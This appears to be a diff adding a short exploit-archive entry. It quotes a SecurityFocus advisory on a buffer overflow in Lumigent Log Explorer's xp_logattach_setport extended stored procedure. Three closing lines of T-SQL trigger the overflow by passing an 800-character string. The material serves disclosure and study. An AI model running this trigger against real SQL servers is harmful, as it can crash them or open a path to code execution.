@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/5017/info
+
+A buffer overflow vulnerability in xp_logattach.dll has been reported for Lumigent Log Explorer. Specifically, this affects the xp_logattach_setport stored procedure.
+
+If this condition is successfully exploited, it is possible for locations in memory to be overwritten with attacker-supplied instructions, allowing for code execution as the SQL server process. By default, SQL Server runs as a non-privileged user.
+
+It should be noted that extended stored procedures can be run only by the dbo user by default. 
+
+declare @bo varchar(8000)
+set @bo = replicate('A', 800)
+exec xp_logattach_setport @bo
